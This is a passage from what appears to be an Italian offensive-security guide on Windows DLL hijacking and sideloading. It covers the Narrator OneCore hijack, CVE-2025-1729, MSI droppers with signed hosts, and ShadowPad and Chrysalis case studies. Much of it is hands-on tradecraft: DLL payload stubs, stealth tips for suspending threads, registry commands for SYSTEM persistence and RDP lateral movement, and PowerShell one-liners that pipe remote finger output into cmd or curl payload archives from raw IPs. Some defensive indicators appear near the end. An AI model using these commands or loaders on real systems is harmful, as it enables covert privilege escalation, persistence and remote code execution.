- Se nel percorso OneCore è presente una DLL scrivibile e controllata dall'attaccante, questa viene caricata ed esegue `DllMain(DLL_PROCESS_ATTACH)`. Non sono necessarie esportazioni.

Individuazione con Procmon
- Filtro: `Process Name is Narrator.exe` e `Operation is Load Image` o `CreateFile`.
- Avvia Narrator e osserva il tentativo di caricamento del percorso sopra indicato.

DLL minimale
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Silenzio OPSEC
- Un hijack ingenuo farà parlare/evidenziare l’interfaccia utente. Per agire senza farsi notare, all’attach enumera i thread di Narrator, apri il thread principale (`OpenThread(THREAD_SUSPEND_RESUME)`) e sospendilo con `SuspendThread`; prosegui nel tuo thread. Consulta il PoC per il codice completo.<sup>[[8]](#references)</sup>

Trigger e persistenza tramite configurazione Accessibility
- Contesto utente (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con quanto sopra, avviando Narrator viene caricata la DLL inserita. Sul desktop protetto (schermata di accesso), premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sul desktop protetto.

Esecuzione di codice come SYSTEM attivata tramite RDP (movimento laterale)
- Consenti il livello di sicurezza RDP classico: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Connettiti all’host tramite RDP e, nella schermata di accesso, premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sul desktop protetto.
- L’esecuzione si interrompe quando la sessione RDP viene chiusa: esegui l’inject/migrate tempestivamente.

Bring Your Own Accessibility (BYOA)
- Puoi clonare una voce di registro di uno strumento Accessibility (AT) integrato (ad es., CursorIndicator), modificarla in modo che punti a un binario/DLL arbitrario, importarla e poi impostare `configuration` sul nome di quell’AT. In questo modo puoi eseguire codice arbitrario tramite il framework Accessibility.

Note
- Per scrivere in `%windir%\System32` e modificare i valori HKLM sono necessari i diritti di amministratore.
- Tutta la logica del payload può risiedere in `DLL_PROCESS_ATTACH`; non sono necessari export.

## Caso di studio: CVE-2025-1729 - Escalation dei privilegi tramite TPQMAssistant.exe

Questo caso illustra il **Phantom DLL Hijacking** in TrackPoint Quick Menu di Lenovo (`TPQMAssistant.exe`), identificato come **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Dettagli della vulnerabilità

- **Componente**: `TPQMAssistant.exe`, situato in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Attività pianificata**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` viene eseguita ogni giorno alle 9:30 nel contesto dell’utente che ha effettuato l’accesso.
- **Autorizzazioni della directory**: scrivibile da `CREATOR OWNER`, consentendo agli utenti locali di depositare file arbitrari.
- **Comportamento di ricerca delle DLL**: tenta prima di caricare `hostfxr.dll` dalla directory di lavoro e registra "NAME NOT FOUND" se il file non è presente, indicando che la ricerca dà precedenza alla directory locale.

### Implementazione dell’exploit

Un attaccante può inserire uno stub malevolo di `hostfxr.dll` nella stessa directory, sfruttando l’assenza della DLL per ottenere l’esecuzione di codice nel contesto dell’utente:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Flusso dell'attacco

1. Come utente standard, copia `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendi che l'attività pianificata venga eseguita alle 9:30 sotto il contesto dell'utente corrente.
3. Se al momento dell'esecuzione dell'attività è connesso un amministratore, la DLL malevola viene eseguita nella sessione dell'amministratore con integrità media.
4. Combina le tecniche standard di UAC bypass per passare dall'integrità media ai privilegi SYSTEM.

## Caso di studio: Dropper MSI CustomAction + DLL Side-Loading tramite host firmato (wsc_proxy.exe)

Gli attori delle minacce spesso abbinano dropper basati su MSI al DLL side-loading per eseguire payload tramite un processo attendibile e firmato.<sup>[[10]](#references)</sup>

Panoramica della catena
- L'utente scarica l'MSI. Una CustomAction viene eseguita in modalità silenziosa durante l'installazione grafica (ad esempio, LaunchApplication o un'azione VBScript) e ricostruisce lo stadio successivo usando risorse incorporate.
- Il dropper scrive un EXE legittimo e firmato e una DLL malevola nella stessa directory (coppia di esempio: wsc_proxy.exe firmato da Avast + wsc.dll controllato dall'attaccante).
- All'avvio dell'EXE firmato, l'ordine di ricerca delle DLL di Windows carica prima wsc.dll dalla directory di lavoro, eseguendo il codice dell'attaccante tramite un processo genitore firmato (ATT&CK T1574.001).

Analisi MSI (elementi da cercare)
- Tabella CustomAction:
  - Cerca voci che eseguono eseguibili o VBScript. Esempio di schema sospetto: LaunchApplication che esegue in background un file incorporato.
  - In Orca (Microsoft Orca.exe), esamina le tabelle CustomAction, InstallExecuteSequence e Binary.
- Payload incorporati/suddivisi nel CAB dell'MSI:
  - Estrazione amministrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Oppure usa lessmsi: lessmsi x package.msi C:\out
  - Cerca più frammenti di piccole dimensioni che vengono concatenati e decrittati da una CustomAction VBScript. Flusso comune:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Sideloading pratico con wsc_proxy.exe
- Inserisci questi due file nella stessa cartella:
  - wsc_proxy.exe: host legittimo firmato (Avast). Il processo tenta di caricare wsc.dll per nome dalla propria directory.
  - wsc.dll: DLL dell'attaccante. Se non sono richieste esportazioni specifiche, può bastare DllMain; altrimenti, crea una proxy DLL e inoltra le esportazioni richieste alla libreria originale, eseguendo il payload in DllMain.
- Crea un payload DLL minimale:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Per i requisiti di export, usa un framework di proxying (ad es. DLLirant/Spartacus) per generare una DLL di forwarding che esegua anche il tuo payload.

- Questa tecnica si basa sulla risoluzione dei nomi delle DLL da parte del binario host. Se l'host usa percorsi assoluti o flag di caricamento sicuro (ad es. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), l'hijack potrebbe non riuscire.
- KnownDLLs, SxS ed export inoltrati possono influenzare la precedenza e vanno considerati nella scelta del binario host e del set di export.

## Triadi firmate + payload crittografati (caso di studio ShadowPad)

Check Point ha descritto come Ink Dragon distribuisce ShadowPad usando una **triade di tre file** per confondersi con software legittimo mantenendo il payload principale crittografato su disco:<sup>[[12]](#references)</sup>

1. **EXE host firmato** – vengono abusati vendor come AMD, Realtek o NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Gli attaccanti rinominano l'eseguibile per farlo sembrare un binario Windows (ad esempio `conhost.exe`), ma la firma Authenticode rimane valida.
2. **DLL loader malevola** – viene depositata accanto all'EXE con un nome previsto (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL è solitamente un binario MFC offuscato con il framework ScatterBrain; il suo unico compito è individuare il blob crittografato, decrittarlo e mappare ShadowPad in modo riflessivo.
3. **Blob payload crittografato** – spesso memorizzato come `<name>.tmp` nella stessa directory. Dopo aver mappato in memoria il payload decrittato, il loader elimina il file TMP per distruggere le prove forensi.

Note sulle tecniche operative:

* Rinominare l'EXE firmato (mantenendo l'`OriginalFileName` originale nell'header PE) gli permette di spacciarsi per un binario Windows pur conservando la firma del vendor; quindi, replica l'abitudine di Ink Dragon di depositare binari simili a `conhost.exe` che in realtà sono utility AMD/NVIDIA.
* Poiché l'eseguibile rimane attendibile, per la maggior parte dei controlli di allowlisting è sufficiente che la DLL malevola si trovi accanto a esso. Concentrati sulla personalizzazione della DLL loader; in genere il parent firmato può essere eseguito senza modifiche.
* Il decryptor di ShadowPad si aspetta che il blob TMP si trovi accanto al loader e sia scrivibile, così da poter azzerare il file dopo il mapping. Mantieni la directory scrivibile finché il payload non viene caricato; una volta in memoria, il file TMP può essere eliminato senza rischi per l'OPSEC.

### Catena di sideloading con stager LOLBAS e archivio staged (finger → tar/curl → WMI)

Gli operatori abbinano il DLL sideloading a LOLBAS, in modo che l'unico artefatto personalizzato su disco sia la DLL malevola accanto all'EXE attendibile:<sup>[[1]](#references)</sup>

- **Loader di comandi remoto (Finger):** PowerShell nascosto avvia `cmd.exe /c`, recupera i comandi da un server Finger e li passa a `cmd` tramite pipe:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` recupera testo TCP/79; `| cmd` esegue la risposta del server, consentendo agli operatori di ruotare il server della second stage.

- **Download/estrazione integrati:** scarica un archivio con un'estensione innocua, decomprimilo e prepara il target di sideload insieme alla DLL in una cartella `%LocalAppData%` casuale:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` nasconde l'avanzamento e segue i reindirizzamenti; `tar -xf` usa tar integrato in Windows.

- **Avvio WMI/CIM:** Avviare l'EXE tramite WMI, in modo che la telemetria mostri un processo creato da CIM mentre carica la DLL presente nella stessa directory:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Funziona con i binari che preferiscono DLL locali (ad es. `intelbq.exe`, `nearby_share.exe`); il payload (ad es. Remcos) viene eseguito con il nome attendibile.

- **Hunting:** genera un alert su `forfiles` quando `/p`, `/m` e `/c` compaiono insieme; è raro al di fuori degli script di amministrazione.


## Caso di studio: sideload di un dropper NSIS + Bitdefender Submission Wizard (Chrysalis)

Una recente intrusione di Lotus Blossom ha abusato di una catena di aggiornamento attendibile per distribuire un dropper pacchettizzato con NSIS che preparava un sideload di DLL e payload interamente in memoria.<sup>[[13]](#references)</sup>

Flusso operativo
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo contrassegna come **HIDDEN**, rilascia un Bitdefender Submission Wizard rinominato `BluetoothService.exe`, una `log.dll` malevola e un blob cifrato `BluetoothService`, quindi avvia l'EXE.
- L'host EXE importa `log.dll` e chiama `LogInit`/`LogWrite`. `LogInit` carica il blob tramite mmap; `LogWrite` lo decifra con uno stream personalizzato basato su LCG (costanti **0x19660D** / **0x3C6EF35F**, materiale della chiave derivato da un hash precedente), sovrascrive il buffer con shellcode in chiaro, libera le variabili temporanee e vi salta.
- Per evitare una IAT, il loader risolve le API calcolando l'hash dei nomi delle esportazioni con **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, quindi applicando un avalanche in stile Murmur (**0x85EBCA6B**) e confrontando il risultato con hash target con salt.

Shellcode principale (Chrysalis)
- Decifra un modulo principale simile a un PE ripetendo operazioni di addizione/XOR/sottrazione con la chiave `gQ2JR&9;` per cinque passaggi, quindi carica dinamicamente `Kernel32.dll` → `GetProcAddress` per completare la risoluzione degli import.
- Ricostruisce le stringhe dei nomi delle DLL in fase di esecuzione tramite trasformazioni di rotazione dei bit/XOR carattere per carattere, quindi carica `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un secondo resolver che percorre **PEB → InMemoryOrderModuleList**, analizza la tabella delle esportazioni in blocchi di 4 byte con mixing in stile Murmur e ricorre a `GetProcAddress` solo se l'hash non viene trovato.

Configurazione incorporata e C2
- La configurazione si trova nel file `BluetoothService` rilasciato, all'**offset 0x30808** (dimensione **0x980**), ed è decifrata con RC4 usando la chiave `qwhvb^435h&*7`, rivelando l'URL C2 e lo User-Agent.
- I beacon creano un profilo host delimitato da punti, antepongono il tag `4Q`, quindi lo cifrano con RC4 usando la chiave `vAuig34%^325hGV` prima di chiamare `HttpSendRequestA` su HTTPS. Le risposte vengono decifrate con RC4 e gestite tramite uno switch di tag (`4T` shell, `4V` esecuzione di processi, `4W/4X` scrittura di file, `4Y` lettura/esfiltrazione, `4\\` disinstallazione, `4` enumerazione di unità/file + casi di trasferimento a blocchi).
- La modalità di esecuzione è determinata dagli argomenti della CLI: senza argomenti = installa la persistenza (servizio/chiave Run) puntando a `-i`; `-i` riavvia se stesso con `-k`; `-k` salta l'installazione ed esegue il payload.

Loader alternativo osservato
- La stessa intrusione ha rilasciato Tiny C Compiler e ha eseguito `svchost.exe -nostdlib -run conf.c` da `C:\ProgramData\USOShared\`, con `libtcc.dll` nella stessa directory. Il codice sorgente C fornito dall'attaccante incorporava shellcode, lo compilava e lo eseguiva in memoria senza scrivere un PE su disco. Riprodurre con:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Questa fase di compilazione ed esecuzione basata su TCC importava `Wininet.dll` a runtime e recuperava una shellcode di secondo stage da un URL hardcoded, fornendo un loader flessibile che si mascherava da esecuzione del compilatore.

## Signed-host sideloading with export proxying + host thread parking

Alcune catene di DLL sideloading aggiungono **accorgimenti per la stabilità** affinché l’host legittimo rimanga in esecuzione abbastanza a lungo da caricare correttamente gli stage successivi, invece di bloccarsi dopo il caricamento della DLL malevola.<sup>[[11]](#references)</sup>

Pattern osservato
- Inserire un EXE attendibile accanto a una DLL malevola usando il nome di dipendenza previsto, ad esempio `version.dll`.
- La DLL malevola **fa da proxy per ogni export previsto**, inoltrandolo alla DLL di sistema reale (ad esempio `%SystemRoot%\\System32\\version.dll`), così che la risoluzione degli import vada a buon fine e il processo host continui a funzionare.
- Dopo il caricamento, la DLL malevola **modifica l’entry point dell’host** affinché il thread principale entri in un loop infinito di `Sleep`, invece di uscire o eseguire percorsi di codice che terminerebbero il processo.
- Un nuovo thread svolge il vero lavoro malevolo: decifra il nome o il percorso della DLL dello stage successivo (RC4/XOR sono comuni), quindi la avvia con `LoadLibrary`.

Perché è importante
- Il normale proxying delle DLL mantiene la compatibilità API, ma non garantisce che l’host rimanga in esecuzione abbastanza a lungo per gli stage successivi.
- Parcheggiare il thread principale in `Sleep(INFINITE)` è un modo semplice per mantenere residente il processo firmato, mentre il loader esegue la decifratura, lo staging o l’avvio della rete in un thread worker.
- Cercare solo una `DllMain` sospetta non permette di rilevare questo pattern se il comportamento interessante avviene dopo la modifica dell’entry point dell’host e l’avvio di un thread secondario.

Workflow minimo
1. Copiare l’EXE firmato e determinare quale DLL carica dalla directory locale.
2. Creare una DLL proxy che esporti le stesse funzioni e le inoltri alla DLL legittima.
3. In `DllMain(DLL_PROCESS_ATTACH)`, creare un thread worker.
4. Dal thread, modificare l’entry point dell’host o la routine di avvio del thread principale affinché entri in un loop su `Sleep`.
5. Decifrare il nome/la configurazione della DLL dello stage successivo e chiamare `LoadLibrary` oppure eseguire il manual mapping del payload.

Indicatori difensivi
- Processi firmati che caricano `version.dll` o librerie comuni simili dalla propria directory applicativa anziché da `System32`.
- Patch alla memoria in corrispondenza dell’entry point del processo subito dopo il caricamento dell’immagine, in particolare jump/call reindirizzati a `Sleep`/`SleepEx`.
- Thread creati da una DLL proxy che chiamano subito `LoadLibrary` su una seconda DLL con nome decifrato.
- DLL proxy con tutti gli export posizionate accanto a eseguibili di vendor in directory di staging scrivibili come `ProgramData`, `%TEMP%` o percorsi di archivi decompressi.

## References

- [1] [Red Canary – Approfondimenti di intelligence: gennaio 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Escalation dei privilegi tramite TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Semplice esempio in C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore distribuisce nuovo malware che prende di mira l’Europa](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: quando i DLL hijack incontrano gli helper di Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Doppelgänger digitali: anatomia delle campagne di impersonificazione in evoluzione che distribuiscono Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Interessi convergenti: analisi dei cluster di minacce che prendono di mira un governo del Sud-est asiatico](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Dentro Ink Dragon: svelare la rete di relay e il funzionamento interno di un’operazione offensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – La backdoor Chrysalis: analisi approfondita del toolkit di Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno: catena ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracciamento delle campagne di spionaggio del 2026 di Screening Serpens, APT iraniano](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Elemento `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Elemento `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Elemento `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Elemento `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Elemento `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Elemento `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: le operazioni di Nimbus Manticore durante il conflitto iraniano](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Azioni delle attività](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 prende di mira governi e infrastrutture critiche del Sud-est asiatico](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
